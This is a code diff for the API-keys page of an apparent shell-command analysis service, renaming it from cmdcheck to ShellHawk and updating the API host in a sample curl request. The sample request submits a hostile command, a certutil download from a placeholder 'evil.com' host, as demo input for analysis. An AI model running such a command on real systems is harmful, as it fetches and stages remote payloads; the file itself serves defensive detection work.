@@ -4,7 +4,7 @@ import { redirect } from "next/navigation";
 import ApiKeysClient from "./ApiKeysClient";
 import { backendUrl } from "@/app/lib/api";
 
-export const metadata: Metadata = { title: "API keys — cmdcheck" };
+export const metadata: Metadata = { title: "API keys — ShellHawk" };
 
 async function getKeys(email: string) {
   try {
@@ -37,7 +37,7 @@ export default async function ApiKeysPage() {
 
       <div className="border border-[var(--border)] rounded-lg px-4 py-4 bg-[var(--surface)] flex flex-col gap-2">
         <p className="text-xs font-semibold text-[var(--muted)] uppercase tracking-wide">Example request</p>
-        <pre className="font-mono text-xs text-[var(--foreground)] whitespace-pre-wrap">{`curl -X POST https://api.cmdcheck.io/analyze \\
+        <pre className="font-mono text-xs text-[var(--foreground)] whitespace-pre-wrap">{`curl -X POST https://api.shellhawk.net/analyze \\
   -H "X-API-Key: cckey_…" \\
   -H "Content-Type: application/json" \\
   -d '{"command": "certutil -urlcache -split -f http://evil.com/p"}'`}</pre>
